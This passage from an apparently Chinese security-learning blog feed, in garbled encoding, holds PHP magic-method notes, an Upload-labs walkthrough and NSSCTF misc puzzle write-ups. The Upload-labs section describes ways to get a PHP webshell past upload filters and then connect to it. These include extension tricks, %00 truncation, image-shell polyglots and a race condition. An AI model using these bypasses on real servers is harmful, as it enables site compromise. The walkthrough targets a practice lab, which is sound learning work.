variable">$this</span><span class="token operator">-></span><span class="token variable">$property_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$p1</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">/*ç›´æ¥è·å–ç§æœ‰å±æ€§å¾—å€¼ï¼Œä¼šè‡ªåŠ¨è°ƒç”¨__get()çš„æ–¹æ³•ï¼Œè¿”å›æˆå‘˜å±æ€§çš„å€¼*/</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'å§“åï¼š'</span><span class="token operator">.</span><span class="token variable">$p1</span><span class="token operator">-></span><span class="token property">name</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;br/>'</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'æ€§åˆ«ï¼š'</span><span class="token operator">.</span><span class="token variable">$p1</span><span class="token operator">-></span><span class="token property">sex</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;br/>'</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'å¹´é¾„ï¼š'</span><span class="token operator">.</span><span class="token variable">$p1</span><span class="token operator">-></span><span class="token property">age</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;br/>'</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="set"><a href="#set" class="headerlink" title="__set"></a>__set</h2><p><strong>ç»™ä¸€ä¸ªæœªå®šä¹‰çš„å±æ€§èµ‹å€¼æ—¶ï¼Œæ­¤æ–¹æ³•ä¼šè¢«è§¦å‘</strong></p><p>ä¼ é€’çš„å‚æ•°æ˜¯è¢«è®¾ç½®çš„å±æ€§åå’Œå€¼ã€‚</p><h2 id="invoke"><a href="#invoke" class="headerlink" title="__invoke"></a>__invoke</h2><p><strong>è°ƒç”¨å¯¹è±¡åå½“æ–¹æ³•ä½¿ç”¨æ—¶ï¼Œè‡ªåŠ¨è°ƒç”¨</strong></p><p>å®ä¾‹ï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">class</span> <span class="token class-name-definition class-name">autofelix</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'ä½ è¿˜æƒ³è°ƒç”¨æˆ‘?'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">autofelix</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//å¯¹è±¡ç›´æ¥å½“å‡½æ•°è°ƒç”¨</span><span class="token variable">$a</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//ç»“æœ: ä½ è¿˜æƒ³è°ƒç”¨æˆ‘?</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> ç¬”è®° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> é­”æœ¯æ–¹æ³• </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Upload-labs 1-20Pass</title>
      <link href="/2023/09/20/upload-labs%201-20Pass/"/>
      <url>/2023/09/20/upload-labs%201-20Pass/</url>
      
        <content type="html"><![CDATA[<p>æœ¬æ–‡ä½¿ç”¨çš„ç‰ˆæœ¬</p><p><img src="https://imag.keyblue.cn/imag/202309201252390.png" alt="image-20230920125230345"></p><h2 id="Pass-01"><a href="#Pass-01" class="headerlink" title="Pass-01"></a>Pass-01</h2><p>è¿™ä¸€å…³åªåœ¨å‰ç«¯å¯¹æ–‡ä»¶è¿›è¡Œæ£€æŸ¥</p><p>ä¸Šä¼ å‰å…ˆå°†æœ¨é©¬æ–‡ä»¶æ›´æ”¹åç¼€ä¸ºjpgï¼Œç„¶åä½¿ç”¨burpæ‹¦æˆª</p><p><img src="https://imag.keyblue.cn/imag/202309061453074.png" alt="image-20230906145315039"></p><p>ç„¶åå°†1.jpgæ”¹åä¸º1.phpåä¸Šä¼ </p><p><img src="https://imag.keyblue.cn/imag/202309061454016.png" alt="image-20230906145428980"></p><p>ä½¿ç”¨èšå‰‘è¿æ¥</p><p><img src="https://imag.keyblue.cn/imag/202309061455745.png" alt="image-20230906145549715"></p><h2 id="Pass-02"><a href="#Pass-02" class="headerlink" title="Pass-02"></a>Pass-02</h2><p>å…ˆæ¸…é™¤ä¸Šä¼ æ–‡ä»¶</p><p>è¿™ä¸€å…³æ˜¯MIMEç±»å‹ç»•è¿‡ï¼Œåªè¦å°†Content-Typeçš„å‚æ•°æ”¹ä¸ºimage&#x2F;jpegç»•è¿‡</p><p><img src="https://imag.keyblue.cn/imag/202309061502388.png" alt="image-20230906150227360"></p><p>ä½¿ç”¨èšå‰‘è¿æ¥æˆåŠŸ</p><h2 id="Pass-03"><a href="#Pass-03" class="headerlink" title="Pass-03"></a>Pass-03</h2><p>å…ˆæ¸…é™¤ä¸Šä¼ æ–‡ä»¶</p><p>å…ˆä¸Šä¼ 1.phpï¼Œå‘ç°è¢«æ‹¦æˆªäº†</p><p><img src="https://imag.keyblue.cn/imag/202309061507161.png" alt="image-20230906150726144"></p><p>å¯ä»¥è¢«phpè§£æçš„æ–‡ä»¶åç¼€</p><pre class="line-numbers language-none"><code class="language-none">php3ï¼Œphp5ï¼Œphtï¼Œphtmlï¼Œphps<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æŠŠæ–‡ä»¶åç¼€æ”¹ä¸ºphp3åä¸Šä¼ ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè¿™ä¸€å…³æŠŠä¸Šä¼ çš„æ–‡ä»¶é‡å‘½åäº†ï¼Œæˆ‘ä»¬å†burpæ‹¦æˆªè¯·æ±‚å³å¯çœ‹åˆ°æ–°çš„æ–‡ä»¶åã€‚</p><p><img src="https://imag.keyblue.cn/imag/202309061520169.png" alt="image-20230906152033143"></p><p>æœ€åä½¿ç”¨èšå‰‘è¿æ¥æˆåŠŸ</p><p><img src="https://imag.keyblue.cn/imag/202309061518283.png" alt="image-20230906151837254"></p><h2 id="Pass-04"><a href="#Pass-04" class="headerlink" title="Pass-04"></a>Pass-04</h2><p>æµ‹è¯•äº†å¾ˆå¤šåç¼€éƒ½ä¸è¡Œï¼Œæœ€ååœ¨åç¼€åå†åŠ ä¸€ä¸ªè§£é‡Šå™¨æ— æ³•è¯†åˆ«çš„åç¼€ï¼ŒæˆåŠŸä¸Šä¼ </p><p><img src="https://imag.keyblue.cn/imag/202309061543506.png" alt="image-20230906154346478"></p><p>ä½¿ç”¨èšå‰‘è¿æ¥æˆåŠŸ</p><p><img src="https://imag.keyblue.cn/imag/202309061544860.png" alt="image-20230906154429830"></p><p><strong>è¿™ä¸€å…³çœŸæ­£çš„æºç ä¸æºç æç¤ºä¸ä¸€è‡´ï¼</strong></p><h2 id="Pass-05"><a href="#Pass-05" class="headerlink" title="Pass-05"></a>Pass-05</h2><p>æˆåŠŸä¸Šä¼ a.txtï¼Œè¯´æ˜è¿™ä¸€å…³å¹¶æ²¡æœ‰å¯¹æ–‡ä»¶å¤´å’Œæ–‡ä»¶ç±»å‹åšæ£€æŸ¥ï¼Œè¿™æ ·å°±è¦å†åç¼€åä¸Šä¸‹æ‰‹äº†</p><p><img src="https://imag.keyblue.cn/imag/202309061600679.png" alt="image-20230906160037654"></p><p>ä¸Šä¼ a.php.j</p><p><img src="https://imag.keyblue.cn/imag/202309061601596.png" alt="image-20230906160159573"></p><p>å¯ä»¥çœ‹åˆ°æ–‡ä»¶è¢«é‡å‘½åäº†ï¼Œphpåç¼€è¢«åˆ é™¤</p><p><img src="https://imag.keyblue.cn/imag/202309061602774.png" alt="image-20230906160254750"></p><p>åˆ†ææºç ï¼Œå‘ç°æ²¡æœ‰å°†åç¼€è½¬æ¢ä¸ºå°å†™ï¼Œéšå³ä¸Šä¼ 1.PHP</p><p><img src="https://imag.keyblue.cn/imag/202309161105957.png" alt="image-20230916110556922"></p><p>æ‹¦æˆªåˆ°è®¿é—®è¯¥å›¾ç‰‡çš„è¯·æ±‚ï¼Œç›´æ¥ç”¨èšå‰‘è¿æ¥æˆåŠŸã€‚</p><p><img src="https://imag.keyblue.cn/imag/202309161107878.png" alt="image-20230916110715856"></p><h2 id="Pass-06"><a href="#Pass-06" class="headerlink" title="Pass-06"></a>Pass-06</h2><p>è§‚å¯Ÿæºç ï¼Œå‘ç°æ²¡æœ‰å¯¹ç©ºæ ¼è¿‡æ»¤ï¼Œéšå³ä¸Šä¼ æˆåŠŸ</p><p><img src="https://imag.keyblue.cn/imag/202309161124934.png" alt="image-20230916112415911"></p><h2 id="Pass-07"><a href="#Pass-07" class="headerlink" title="Pass-07"></a>Pass-07</h2><p>è§‚å¯Ÿæºç ï¼Œå‘ç°æºç æ²¡æœ‰å¯¹æ–‡ä»¶è¿›è¡Œé‡å‘½åï¼Œéšå³ä½¿ç”¨å¤šé‡åç¼€ä¸Šä¼ </p><p><img src="https://imag.keyblue.cn/imag/202309161142881.png" alt="image-20230916114216844"></p><h2 id="Pass-08"><a href="#Pass-08" class="headerlink" title="Pass-08"></a>Pass-08</h2><p>è§‚å¯Ÿæºç å‘ç°æ²¡æœ‰è¿‡æ»¤<code>::DATA</code>ï¼Œéšå³ä¸Šä¼ </p><p><img src="https://imag.keyblue.cn/imag/202309161153982.png" alt="image-20230916115318935"></p><h2 id="Pass-09"><a href="#Pass-09" class="headerlink" title="Pass-09"></a>Pass-09</h2><p>deldot() å‡½æ•°ä»æœ«å°¾å‘å‰æ£€æµ‹ï¼Œæ£€æµ‹åˆ°ç¬¬ä¸€ä¸ªç‚¹åï¼Œä¼šç»§ç»­å‘å‰æ£€æµ‹ï¼Œä½†é‡åˆ°ç©ºæ ¼æˆ–å­—ç¬¦ä¼šåœä¸‹æ¥</p><p><img src="https://imag.keyblue.cn/imag/202309181520090.png" alt="image-20230918152032038"></p><p>ç¨‹åºå»æ‰ç‚¹åçš„æ–‡ä»¶åä¸º<code>1.php. </code>ï¼Œä¿å­˜åæ–‡ä»¶åå˜ä¸º<code>1.php</code></p><h2 id="Pass-10"><a href="#Pass-10" class="headerlink" title="Pass-10"></a>Pass-10</h2><p>ä¸Šä¼ <code>1.php</code>æµ‹è¯•ï¼Œä¸Šä¼ æˆåŠŸ</p><p><img src="https://imag.keyblue.cn/imag/202309181553958.png" alt="image-20230918155317916"></p><p>ä½†æ˜¯phpåç¼€è¢«æ›¿æ¢ä¸ºç©ºå€¼</p><p><img src="https://imag.keyblue.cn/imag/202309181552907.png" alt="image-20230918155249876"></p><p>éšå³åŒå†™ç»•è¿‡</p><p><img src="https://imag.keyblue.cn/imag/202309181555092.png" alt="image-20230918155523050"></p><p>æ–‡ä»¶ä¹Ÿæ­£å¸¸ä¿å­˜äº†</p><p><img src="https://imag.keyblue.cn/imag/202309181555717.png" alt="image-20230918155554681"></p><h2 id="Pass-11"><a href="#Pass-11" class="headerlink" title="Pass-11"></a>Pass-11</h2><p>è§‚å¯Ÿæºä»£ç </p><p><img src="https://imag.keyblue.cn/imag/202309181603752.png" alt="image-20230918160321712"></p><p>æ³¨æ„åˆ°ï¼š</p><p>strrposå‡½æ•°è®¡ç®—<code>.</code>æœ€åä¸€æ¬¡å‡ºç°çš„ä½ç½®ï¼Œsubstræˆªå–<code>.</code>ä¹‹åçš„å­—ç¬¦ä¸²</p><p>å†é€šè¿‡in_arrayå‡½æ•°åˆ¤æ–­<code>.</code>åçš„å­—ç¬¦ä¸²æ˜¯å¦åœ¨ç™½åå•é‡Œï¼Œåªæœ‰åœ¨ç™½åå•é‡Œçš„æ–‡ä»¶åç¼€æ‰èƒ½é€šè¿‡ï¼Œç¨‹åºæœ€åè¿˜ä¼šå¯¹æ–‡ä»¶è¿›è¡Œé‡å‘½å</p><p>æ³¨æ„åˆ°getä¼ å‚<code>save_path</code>ï¼Œå¯ä½¿ç”¨%00éš”æ–­ï¼Œæ„æ€å°±æ˜¯ç›´æ¥ä½¿ç”¨getå»ä¼ æ–‡ä»¶åï¼Œå› ä¸ºæ–‡ä»¶çš„æœ€ç»ˆåç§°æ‹¼æ¥è€Œæˆçš„ï¼Œæ”¹å˜<code>save_path</code>å‚æ•°åŠ ä¸Š%00å³å¯æ§åˆ¶æ–‡ä»¶åç§°ï¼Œ</p><p><img src="https://imag.keyblue.cn/imag/202309181643165.png" alt="image-20230918164336123"></p><p>%00çš„ä½œç”¨æ˜¯é˜»æ­¢å‡½æ•°ç»§ç»­è¯»å–</p><h2 id="Pass-12"><a href="#Pass-12" class="headerlink" title="Pass-12"></a>Pass-12</h2><p>è¿™é¢˜å’Œä¸Šä¸€é¢˜ä¸€æ ·ï¼Œä¸è¿‡GETä¼ å€¼å˜æˆäº†POSTä¼ å€¼</p><p><img src="https://imag.keyblue.cn/imag/202309181708214.png" alt="image-20230918170831165"></p><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œéœ€è¦å°†è¯¥è·¯å¾„è¿›è¡Œurlè§£ç åæ‰èƒ½å‘å‡ºï¼Œä¸ç„¶ä¼šä¸Šä¼ å¤±è´¥</p><p><img src="https://imag.keyblue.cn/imag/202309181711251.png" alt="image-20230918171141208"></p><h2 id="Pass-13"><a href="#Pass-13" class="headerlink" title="Pass-13"></a>Pass-13</h2><p>JPG</p><p>è¯¥passæ£€æŸ¥æ–‡ä»¶å¤´ï¼Œç”¨copyå‘½ä»¤æ•´åˆçš„jpgå›¾ç‰‡é©¬å¯ä»¥è½»æ¾ä¸Šä¼ ï¼Œ</p><p><img src="https://imag.keyblue.cn/imag/202309181729394.png" alt="image-20230918172958343"></p><p>ç»“åˆé¶åœºæä¾›çš„æ–‡ä»¶åŒ…å«æµ‹è¯•ï¼Œå¯ä»¥çœ‹åˆ°æ¶æ„ä»£ç è¢«æ‰§è¡Œäº†</p><p>GIF</p><p><img src="https://imag.keyblue.cn/imag/202309181822466.png" alt="image-20230918182207420"></p><h2 id="Pass-14"><a href="#Pass-14" class="headerlink" title="Pass-14"></a>Pass-14</h2><p>åŒä¸Šå³å¯</p><h2 id="Pass-15"><a href="#Pass-15" class="headerlink" title="Pass-15"></a>Pass-15</h2><p>åŒä¸Šå³å¯</p><h2 id="Pass-16"><a href="#Pass-16" class="headerlink" title="Pass-16"></a>Pass-16</h2><p>è¿™ä¸€å…³å¯¹å›¾ç‰‡è¿›è¡Œäº†äºŒæ¬¡æ¸²æŸ“ï¼Œå‰é¢passçš„å›¾ç‰‡é©¬ä¸­çš„æ¶æ„ä»£ç ä¼šè¢«è¦†ç›–æ‰ï¼Œæ‰€ä»¥å¿…é¡»å°†æ¶æ„ä»£ç æ”¾åœ¨ä¸ä¼šè¢«è¦†ç›–çš„ä½ç½®</p><p>å…ˆä¸Šä¼ åŸå›¾ï¼Œç„¶åå°†äºŒæ¬¡æ¸²æŸ“çš„å›¾ä¿å­˜ä¸‹æ¥ï¼Œä½¿ç”¨010ä¸åŸå›¾æ¯”è¾ƒï¼Œåœ¨è“è‰²çš„åŒ¹é…åŒºåŸŸæ’å…¥æ¶æ„ä»£ç </p><p><img src="https://imag.keyblue.cn/imag/202309181907321.png" alt="image-20230918190749268"></p><p>ä¸Šä¼ æ›´æ”¹åçš„æ–‡ä»¶</p><p><img src="https://imag.keyblue.cn/imag/202309181909805.png" alt="image-20230918190947760"></p><p>ä¸Šä¼ åå°è¯•åŒ…å«</p><p><img src="https://imag.keyblue.cn/imag/202309181908305.png" alt="image-20230918190838273"></p><h2 id="Pass-17"><a href="#Pass-17" class="headerlink" title="Pass-17"></a>Pass-17</h2><p>å¯¹è¯¥passè¿›è¡Œæºç å®¡è®¡ï¼Œå‘ç°ä¸è®ºæ–‡ä»¶åæ˜¯ä»€ä¹ˆéƒ½ä¼šåœ¨uploadç›®å½•ä¸‹å­˜åœ¨è¿‡ï¼Œè¿™æ˜¯å…¸å‹çš„æ¡ä»¶ç«äº‰</p><p>æ–°å»ºä¸€ä¸ªæµ‹è¯•å™¨ä¸Šä¼ 1.phpï¼Œå†…å®¹æ˜¯ä¿å­˜ä¸€ä¸ªæ–°çš„è„šæœ¬æ–‡ä»¶ï¼Œå› ä¸ºæ—§çš„æ–‡ä»¶åªä¼šå­˜åœ¨å¾ˆçŸ­çš„æ—¶é—´ã€‚</p><p>ç„¶åéšä¾¿æ·»åŠ ä¸€ä¸ªgetä¼ å‚ï¼Œåç§°æ— æ‰€è°“ï¼Œå‚æ•°ä¹Ÿæ— æ‰€è°“ï¼Œåªè¦æ¬¡æ•°è¶³å¤Ÿã€‚</p><p><img src="https://imag.keyblue.cn/imag/202309201016383.png" alt="image-20230920101615338"></p><p>å†æ–°å»ºä¸€ä¸ªæµ‹è¯•è®¿é—®1.phpï¼Œç›®çš„æ˜¯æ‰§è¡Œ1.php</p><p>ç„¶åéšä¾¿æ·»åŠ ä¸€ä¸ªgetä¼ å‚ï¼Œåç§°æ— æ‰€è°“ï¼Œå‚æ•°ä¹Ÿæ— æ‰€è°“ï¼Œåªè¦æ¬¡æ•°è¶³å¤Ÿã€‚å½“è¿™ä¸ªè¿”å›å€¼å‡ºç°200æ—¶ï¼Œè¯´æ˜æ‰§è¡ŒæˆåŠŸï¼Œå±Šæ—¶å°±å¯ä»¥è®¿é—®phpinfo.php</p><p><img src="https://imag.keyblue.cn/imag/202309201024906.png" alt="image-20230920102427863"></p><p>å°†è½½è·éƒ½è®¾ç½®æˆä¸‹å›¾æ‰€ç¤º</p><p><img src="https://imag.keyblue.cn/imag/202309201026881.png" alt="image-20230920102622843"></p><p>ä¾æ¬¡å¼€å¯æµ‹è¯•ï¼ŒæŸ¥çœ‹è®¿é—®1.phpçš„æµ‹è¯•ï¼Œæˆ‘ä»¬å‘ç°å·²ç»è¿”å›200ï¼Œè¯´æ˜phpinfo.phpå·²ç»æˆåŠŸåˆ›å»ºã€‚</p><p><img src="https://imag.keyblue.cn/imag/202309201028238.png" alt="image-20230920102819204"></p><p>è®¿é—®æµ‹è¯•</p><p><img src="https://imag.keyblue.cn/imag/202309201029024.png" alt="image-20230920102900994"></p><h2 id="Pass-18"><a href="#Pass-18" class="headerlink" title="Pass-18"></a>Pass-18</h2><p>ä¸Šä¼ å›¾ç‰‡é©¬åŒ…å«å¯ä»¥è¿‡å…³</p><p>åŒæ ·çš„ï¼Œä¹Ÿå¯ä»¥é€šè¿‡æ¡ä»¶ç«äº‰</p><p>å’Œä¸Šä¸€ä¸ªpassä¸€æ ·çš„æ–¹æ³•ï¼Œä½†æ˜¯æºç å¯¹æ–‡ä»¶åå’Œæ–‡ä»¶å¤´éƒ½åšäº†æ£€æŸ¥ï¼Œæˆ‘ä»¬å–ä¸€ä¸ªæ— æ³•è§£æçš„æ–‡ä»¶åphpinfo.php.7z</p><p><img src="https://imag.keyblue.cn/imag/202309201243396.png" alt="image-20230920124307328"></p><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œæœ¬passä¸Šä¼ çš„æ–‡ä»¶å¹¶ä¸åœ¨uploadç›®å½•ä¸‹ï¼Œè€Œæ˜¯åœ¨ç½‘ç«™æ ¹ç›®å½•</p><p><img src="https://imag.keyblue.cn/imag/202309201245964.png" alt="image-20230920124524925"></p><p>æŸ¥çœ‹ç½‘ç«™æ ¹ç›®å½•ï¼Œå‘ç°phpinfo.phpè¢«åˆ›å»º</p><p><img src="https://imag.keyblue.cn/imag/202309201247415.png" alt="image-20230920124714389"></p><h2 id="Pass-19"><a href="#Pass-19" class="headerlink" title="Pass-19"></a>Pass-19</h2><p>éœ€è¦Linuxç¯å¢ƒï¼Œæ‡’å¾—é…ğŸ¤¤</p><h2 id="Pass-20"><a href="#Pass-20" class="headerlink" title="Pass-20"></a>Pass-20</h2><p>å®¡è®¡ä»£ç ï¼Œå‘ç°å¯ä»¥åˆ©ç”¨æ•°ç»„ç»•è¿‡</p><p><img src="https://imag.keyblue.cn/imag/202309201337886.png" alt="image-20230920133710856"></p><p>å¦‚æœä¼ å…¥æ•°ç»„ï¼Œ<code>$file = explode(&#39;.&#39;, strtolower($file));</code>ä¼šå¤±å»ä½œç”¨ï¼ŒåŒæ—¶<code>$ext = end($file);</code>çš„ä½œç”¨æ˜¯è¿”å›æ•°ç»„çš„æœ€åä¸€ä½ä¹Ÿå¯ä»¥éšæ„ç»•è¿‡ï¼ŒåŒæ—¶å¯å°†<code>$file[count($file) - 1]</code>ä¸ºç©º</p><p><img src="https://imag.keyblue.cn/imag/202309201341007.png" alt="image-20230920134126963"></p><p>å¦‚ä¸Šå›¾ä¸Šä¼ åï¼Œå› ä¸º<code>$file[count($file) - 1]</code>ä¸ºç©ºï¼Œæ‰€ä»¥<code>$file_name</code>ä¼šç­‰äº<code>phpinfo.php.</code>,ä½†<code>move_uploaded_file()</code>åœ¨ä¿å­˜æ—¶ä¼šå¿½ç•¥<code>.</code>,æ‰€ä»¥æœ€åçš„æ–‡ä»¶åç§°ä¸º<code>phpinfo.php</code></p><p><img src="https://imag.keyblue.cn/imag/202309201345594.png" alt="image-20230920134543570"></p><p>THE END</p>]]></content>
      
      
      <categories>
          
          <category> ç¬”è®° </category>
          
          <category> å…¶ä»– </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ–‡ä»¶ä¸Šä¼  </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NSSCTF Miscæ¨¡å—åšé¢˜è®°å½•</title>
      <link href="/2023/08/29/NSSCTF%20Misc%E6%A8%A1%E5%9D%97%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
      <url>/2023/08/29/NSSCTF%20Misc%E6%A8%A1%E5%9D%97%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h1 id="CISCN-2018-Picture"><a href="#CISCN-2018-Picture" class="headerlink" title="[CISCN 2018]Picture"></a>[CISCN 2018]Picture</h1><p>æ‰“å¼€æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œbinwalkè§£å‹å¾—åˆ°ä¸¤ä¸ªæ–‡ä»¶</p><p><img src="https://imag.keyblue.cn/imag/202309061407818.png" alt="image-20230906140725773"></p><p>å…¶ä¸­ä¸€ä¸ªæ˜¯base64ç¼–ç </p><p><img src="https://imag.keyblue.cn/imag/202309061408316.png" alt="image-20230906140828293"></p><p>è§£ç å‘ç°ç¥ä¼¼å‹ç¼©åŒ…ï¼Œæ­¤æ—¶ä¸è¦ç›´æ¥å¤åˆ¶è§£ç åçš„æ˜æ–‡ï¼Œæ‰“å¼€010æ–°å»ºä¸€ä¸ªç©ºæ–‡æœ¬ï¼Œé€‰æ‹©ç²˜è´´è‡ªbase64ã€‚å› ä¸ºä½¿ç”¨åˆ«çš„è½¯ä»¶å¯èƒ½ä¼šå‡ºç°ä¸€äº›é—®é¢˜</p><p><img src="https://imag.keyblue.cn/imag/202309061413984.png" alt="image-20230906141311956"></p><p>å°†æ–‡ä»¶å¤´ä¿®å¤</p><p><img src="https://imag.keyblue.cn/imag/202309061414808.png" alt="image-20230906141457788"></p><p>ç”¨7zæ‰“å¼€ï¼Œä½†æ˜¯è§£å‹æ–‡ä»¶éœ€è¦å¯†ç ï¼Œbingæœç´¢æŠ¥é”™ä¿¡æ¯<code>ZeroDivisionError:</code></p><p><img src="https://imag.keyblue.cn/imag/202309061416489.png" alt="image-20230906141650461"></p><p>æœåˆ°å¤šä¸ªæŠ¥é”™</p><p><img src="https://imag.keyblue.cn/imag/202309061417479.png" alt="image-20230906141758459"></p><p>æœ€ç»ˆè§£å‹å¯†ç ä¸º</p><pre class="line-numbers language-none"><code class="language-none">integer division or modulo by zero<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ‰“å¼€codeæ–‡ä»¶ï¼Œæ˜¯uucodeç¼–ç ï¼Œ</p><p><img src="https://imag.keyblue.cn/imag/202309061419615.png" alt="image-20230906141943595"></p><p>è§£ç </p><p><img src="https://imag.keyblue.cn/imag/202309061420818.png" alt="image-20230906142011796"></p><pre class="line-numbers language-none"><code class="language-none">CISCN&#123;2388AF2893EB85EB1B439ABFF617319F&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="CISCN-2023-åˆèµ›-è¢«åŠ å¯†çš„ç”Ÿäº§æµé‡"><a href="#CISCN-2023-åˆèµ›-è¢«åŠ å¯†çš„ç”Ÿäº§æµé‡" class="headerlink" title="[CISCN 2023 åˆèµ›]è¢«åŠ å¯†çš„ç”Ÿäº§æµé‡"></a>[CISCN 2023 åˆèµ›]è¢«åŠ å¯†çš„ç”Ÿäº§æµé‡</h1><p>ç¬¬ä¸€æ¬¡æ¥è§¦å·¥æ§æµé‡</p><p>è¿½è¸ªTCPæµï¼Œè¿™ä¸ªæµé‡æœ‰ç‚¹å¥‡ç‰¹</p><p><img src="https://imag.keyblue.cn/imag/202309051431254.png" alt="image-20230905143101208"></p><p>è®°å½•ä¸‹æ¥</p><pre class="line-numbers language-none"><code class="language-none">MMYWMX3GNEYWOXZRGAYDA&#x3D;&#x3D;&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ç”¨base32è§£ç </p><p><img src="https://imag.keyblue.cn/imag/202309051439997.png" alt="image-20230905143923959"></p><pre class="line-numbers language-none"><code class="language-none">c1f_fi1g_1000<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="GDOUCTF-2023-pixelart"><a href="#GDOUCTF-2023-pixelart" class="headerlink" title="[GDOUCTF 2023]pixelart"></a>[GDOUCTF 2023]pixelart</h1><p>æ‰“å¼€å‹ç¼©åŒ…ï¼Œæ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œå›¾ç‰‡æœ‰ç‚¹å¤§ã€‚ã€‚ã€‚</p><p><img src="https://imag.keyblue.cn/imag/202309041327813.png" alt="arcaea"></p><p>ç”¨010æ‰“å¼€å›¾ç‰‡ï¼Œæœ‰éšè—çš„ä¿¡æ¯<code>320x180</code></p><p><img src="https://imag.keyblue.cn/imag/202309041332426.png" alt="image-20230904133237393"></p><p>æ”¾å¤§å›¾ç‰‡ä»”ç»†çœ‹ï¼Œå¯ä»¥çœ‹åˆ°flagè¢«ä½¿ç”¨ç™½ç‚¹å†™åœ¨å›¾ç‰‡ä¸Š</p><p><img src="https://imag.keyblue.cn/imag/202309041335333.png" alt="image-20230904133506226"></p><p>æ”¾å¤§å›¾ç‰‡è®°å½•ï¼ŒåŸæ¥è¿™æ˜¯å‡çš„flag</p><pre class="line-numbers language-none"><code class="language-none">flag&#123;fake_flag&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å‘ç°å›¾ç‰‡ä¸Šè¿˜æœ‰å…¶ä»–çš„åƒç´ ç‚¹ï¼ŒåŸå›¾å¤§å°<code>3840x2160</code>ï¼Œæ ¹æ®ä¹‹å‰ç»™å‡ºçš„çº¿ç´¢<code>320x180</code>æˆ‘ä»¬å¯ä»¥çŸ¥é“æ¯ä¸€ä¸ªåƒç´ ç‚¹ä¹‹é—´çš„è·ç¦»ä¸º12</p><p>è¿™é‡Œéœ€è¦ç”¨åˆ°pythonè„šæœ¬æ¥å®ç°æŠŠå›¾ç‰‡åƒç´ åŒ–</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> PIL <span class="token keyword">import</span> Imageoriginal_image <span class="token operator">=</span> Image<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'res/arcaea.png'</span><span class="token punctuation">)</span>new_width <span class="token operator">=</span> original_image<span class="token punctuation">.</span>width <span class="token operator">//</span> <span class="token number">12</span>new_height <span class="token operator">=</span> original_image<span class="token punctuation">.</span>height <span class="token operator">//</span> <span class="token number">12</span>new_image <span class="token operator">=</span> Image<span class="token punctuation">.</span>new<span class="token punctuation">(</span><span class="token string">"RGB"</span><span class="token punctuation">,</span><span class="token punctuation">(</span>new_width<span class="token punctuation">,</span>new_height<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>new_width<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> y <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>new_height<span class="token punctuation">)</span><span class="token punctuation">:</span>        pixel <span class="token operator">=</span> original_image<span class="token punctuation">.</span>getpixel<span class="token punctuation">(</span><span class="token punctuation">(</span>x <span class="token operator">*</span><span class="token number">12</span><span class="token punctuation">,</span>y<span class="token operator">*</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        new_image<span class="token punctuation">.</span>putpixel<span class="token punctuation">(</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span><span class="token 